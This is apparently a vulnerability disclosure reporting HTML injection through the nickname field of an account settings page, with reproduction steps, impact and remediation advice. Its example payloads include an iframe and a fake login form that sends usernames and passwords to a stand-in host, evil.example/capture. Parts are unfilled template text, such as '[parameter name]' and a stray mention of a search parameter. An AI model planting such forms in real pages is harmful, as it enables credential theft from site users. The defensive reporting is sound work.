## Title

HTML Injection via Nickname on Account settings Page

## Vulnerability Type

HTML Injection

## Summary

Romit https://kzlabs.store/transfer/index.php?saved=1#settings nickname parameter is vulnerable to HTML injection.
The website reflects user input from the search parameter without proper sanitisation/encoding, which allows an attacker to inject arbitrary HTML markup that is rendered in the victim's browser when the victim visits a malicious URL. This can be used to alter page content, inject fake forms, or redirect/deceive users (e.g. phishing).

## Vulnerable Endpoint

https://kzlabs.store/transfer/index.php?saved=1#settings

## Steps to Reproduce

1. Navigate to the following URL: `https://kzlabs.store/transfer/index.php?saved=1#settings`
2. Enter Payload in nickname parameter 
3. Observe that the injected HTML is rendered on the page (e.g. injected heading, image, or form appears where the input is reflected)

## Payload used

`<h1 style="color:red">HACKED</h1>`

(Other useful payloads to demonstrate impact: `<img src=x>`, `<iframe src="https://evil.example"></iframe>`, `<form action="https://evil.example/capture"><input name="username"><input type="password" name="password"><input type="submit"></form>`)

## Proof of Concept Request

`Screenshot 1: Screenshot shows payload in vulnerable [field/parameter name]` and `injected HTML rendered on the page`

<img width="1792" height="1120" alt="image" src="https://github.com/user-attachments/assets/c19b47f9-a9f6-4917-9058-4c9bcf38d792" />

## Impact

An attacker can perform the following actions using this vulnerability:

- It allows attackers to alter the visual appearance and content of the page
- It can be used to inject fake login forms to phish user credentials
- It can be used to embed malicious or misleading links/iframes
- It can damage the credibility/trust of the application in the eyes of the victim
- Depending on context, it may act as a stepping stone toward stored/reflected XSS if input filtering is inconsistent

## Recommendations for fix

Validate and sanitise the [parameter name] parameter to ensure it does not contain any malicious HTML content. This can be done by:

1. Encode all user-controlled output before rendering it in HTML context (e.g. use `htmlspecialchars()` in PHP, or an equivalent output-encoding function in the relevant language/framework)
2. Apply a strict allow-list for any HTML tags/attributes that are genuinely required (e.g. via a sanitisation library such as DOMPurify), rather than a deny-list
3. Set a strong Content-Security-Policy (CSP) header to reduce the impact of any injected markup
4. Avoid directly concatenating user input into HTML templates; use templating engines with automatic contextual escaping
5. Use a WAF (e.g. Cloudflare) as a defence-in-depth measure to catch common injection payloads before they reach the server
